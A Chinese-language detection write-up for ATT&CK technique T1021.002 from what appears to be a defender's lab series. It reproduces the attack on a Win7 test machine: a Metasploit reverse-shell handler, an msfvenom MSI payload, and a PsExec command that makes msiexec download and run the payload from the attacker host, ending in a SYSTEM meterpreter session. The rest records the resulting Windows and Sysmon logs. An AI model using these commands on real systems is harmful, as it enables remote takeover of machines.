# T1021-002-win-基于白名单PsExec执行payload

## 来自ATT&CK的描述

攻击者可以使用服务器帐户阻止（SMB）使用有效帐户与远程网络共享进行交互。然后，攻击者可以以登录用户的身份执行操作。

SMB是同一网络或域上Windows计算机的文件，打印机和串行端口共享协议。攻击者可以使用SMB与文件共享进行交互，从而允许他们在整个网络中横向移动。SMB的Linux和macOS实现通常使用Samba。

Windows系统具有隐藏的网络共享，只有管理员才能访问它们，并提供了远程文件复制和其他管理功能。例如网络共享包括C$，ADMIN$，和IPC$。攻击者可以将此技术与管理员级别的有效帐户结合使用，以通过SMB远程访问网络系统；使用远程过程调用（RPC）与系统进行交互；传输文件；以及通过远程执行来运行传输的二进制文件。依赖于SMB/RPC上经过身份验证的会话的示例执行技术为计划任务/作业，服务执行和Windows管理规范。攻击者还可以使用NTLM哈希访问具有散列，特定配置和补丁程序级别的系统上的管理员共享。

## 测试案例

微软于2006年7月收购sysinternals公司，PsExec是SysinternalsSuite的小工具之一，是一种轻量级的telnet替代品，允许在其他系统上执行进程，完成控制台应用程序的完全交互，而无需手动安装客户端软件，并且可以获得与控制台应用程序相当的完全交互性。

微软官方文档：

<https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec>

说明：PsExec.exe没有默认安装在windows系统。

补充说明：在高版本操作系统中，可以通过配置策略，对进程命令行参数进行记录。日志策略开启方法：`本地计算机策略>计算机配置>管理模板>系统>审核进程创建>在过程创建事件中加入命令行>启用`，同样也可以在不同版本操作系统中部署sysmon，通过sysmon日志进行监控。

## 检测日志

windows 安全日志（需要自行配置）

## 测试复现

### 环境准备

攻击机：Kali2019

靶机：win7（sysmon日志）

### 攻击分析

#### 配置MSF

```bash
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 192.168.126.146
lhost => 192.168.126.146
msf5 exploit(multi/handler) > set lport 4444
lport => 4444
msf5 exploit(multi/handler) > exploit
```

#### 生成payload

```bash
msfvenom -a  x86 --platform windows -p  windows/meterpreter/reverse_tcp LHOST=192.168.126.146 LPORT=4444 -f msi > shellcode.msi
```

#### 靶机执行

注意：需要管理员权限

```dos
PsExec.exe -d -s msiexec.exe /q /i http://192.168.126.146/shellcode.msi
```

#### 反弹shell

```bash
msf5 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 192.168.126.146:4444
[*] Sending stage (180291 bytes) to 192.168.126.149
[*] Meterpreter session 1 opened (192.168.126.146:4444 -> 192.168.126.149:49371) at 2020-04-18 23:09:44 +0800

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > getpid
Current pid: 2352
```

## 测试留痕

```log
windows 安全日志
EventID： 4688
进程信息:
新进程 ID: 0xe84
新进程名: C:\Users\12306Br0\Desktop\PSTools\PsExec.exe

EventID： 4688
进程信息:
新进程 ID: 0xfcc
新进程名: C:\Windows\PSEXESVC.exe

EVentID：5140
网络信息:
对象类型: File
源地址: fe80::719e:d312:648f:4884
源端口: 49369
共享信息:
共享名: \\*\IPC$

EventID：5145
网络信息:
对象类型: File
源地址: fe80::719e:d312:648f:4884
源端口: 49369

共享信息:
共享名称: \\*\IPC$
共享路径:
相对目标名称: PSEXESVC

SYSMON日志
EventID：1
Process Create:
RuleName:
UtcTime: 2020-04-18 15:09:29.237
ProcessGuid: {bb1f7c32-1829-5e9b-0000-00107a844001}
ProcessId: 3716
Image: C:\Users\12306Br0\Desktop\PSTools\PsExec.exe
FileVersion: 2.2
Description: Execute processes remotely
Product: Sysinternals PsExec
Company: Sysinternals - www.sysinternals.com
OriginalFileName: psexec.c
CommandLine: PsExec.exe  -d -s msiexec.exe /q /i http://192.168.126.146/shellcode.msi
CurrentDirectory: C:\Users\12306Br0\Desktop\PSTools\
User: 12306Br0-PC\12306Br0
LogonGuid: {bb1f7c32-5fc3-5e99-0000-0020eae10600}
LogonId: 0x6e1ea
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=E50D9E3BD91908E13A26B3E23EDEAF577FB3A095
ParentProcessGuid: {bb1f7c32-1806-5e9b-0000-001070474001}
ParentProcessId: 3492
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: "C:\Windows\System32\cmd.exe"

EventID：1
Process Create:
RuleName:
UtcTime: 2020-04-18 15:09:29.284
ProcessGuid: {bb1f7c32-1829-5e9b-0000-00108c864001}
ProcessId: 4044
Image: C:\Windows\PSEXESVC.exe
FileVersion: 2.2
Description: PsExec Service
Product: Sysinternals PsExec
Company: Sysinternals
OriginalFileName: psexesvc.exe
CommandLine: C:\Windows\PSEXESVC.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {bb1f7c32-a6a0-5e60-0000-0020e7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=A17C21B909C56D93D978014E63FB06926EAEA8E7
ParentProcessGuid: {bb1f7c32-a6a0-5e60-0000-001025ae0000}
ParentProcessId: 496
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe

EventID：1
Process Create:
RuleName:
UtcTime: 2020-04-18 15:09:29.440
ProcessGuid: {bb1f7c32-1829-5e9b-0000-00103c894001}
ProcessId: 1916
Image: C:\Windows\System32\msiexec.exe
FileVersion: 5.0.7601.17514 (win7sp1_rtm.101119-1850)
Description: Windows® installer
Product: Windows Installer - Unicode
Company: Microsoft Corporation
OriginalFileName: msiexec.exe
CommandLine: "msiexec.exe" /q /i http://192.168.126.146/shellcode.msi
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {bb1f7c32-a6a0-5e60-0000-0020e7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=443AAC22D57EDD4EF893E2A245B356CBA5B2C2DD
ParentProcessGuid: {bb1f7c32-1829-5e9b-0000-00108c864001}
ParentProcessId: 4044
ParentImage: C:\Windows\PSEXESVC.exe
ParentCommandLine: C:\Windows\PSEXESVC.exe
```

由于sysmon配置问题，只对进程创建行为进行监控

## 检测规则/思路

无具体检测规则，可根据PsExec特征进行检测。

## 参考推荐

MITRE-ATT&CK-T1021-002

<https://attack.mitre.org/techniques/T1021/002/>

基于白名单PsExec执行payload

<https://blog.csdn.net/ws13129/article/details/89879771>
